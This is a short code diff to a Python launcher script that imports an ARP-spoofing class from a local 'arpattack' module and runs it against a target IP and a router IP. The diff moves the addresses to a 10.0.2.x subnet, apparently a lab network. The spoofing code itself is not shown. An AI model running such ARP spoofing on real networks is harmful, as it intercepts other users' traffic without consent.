@@ -1,9 +1,9 @@
-# !/usr/bin/env python
+# !/usr/bin/python3
 from libs.arpattack import ARPspoof
 
 # define global variables
-TARGET_IP = "192.168.1.54"
-ROUTER_IP = "192.168.1.1"
+TARGET_IP = "10.0.2.10"
+ROUTER_IP = "10.0.2.1"
 
 arp_spoofer = ARPspoof(TARGET_IP, ROUTER_IP)
 arp_spoofer.run()
